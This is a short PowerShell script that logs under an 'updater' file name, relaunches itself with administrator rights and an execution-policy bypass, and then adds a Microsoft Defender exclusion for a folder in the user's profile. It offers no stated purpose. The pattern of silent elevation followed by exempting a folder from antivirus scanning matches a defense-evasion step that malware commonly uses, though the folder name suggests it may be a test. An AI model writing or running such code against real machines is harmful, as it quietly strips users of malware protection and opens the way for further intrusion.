# Define a log file path
$logPath = "C:\Windows\Temp\updater_log.txt"

function Write-Log {
    param ($msg)
    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Re-run as admin if needed
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Log "Not running as admin. Relaunching with elevation..."
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

Write-Log "Running as admin. Attempting to add exclusions..."

$foldersToEnsure = @("$env:USERPROFILE\TestSafeFolder")

foreach ($folder in $foldersToEnsure) {
    try {
        Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
        Write-Log "Added exclusion: $folder"
    } catch {
        Write-Log "Exclusion may already exist or failed: $folder. Error: $_"
    }
}
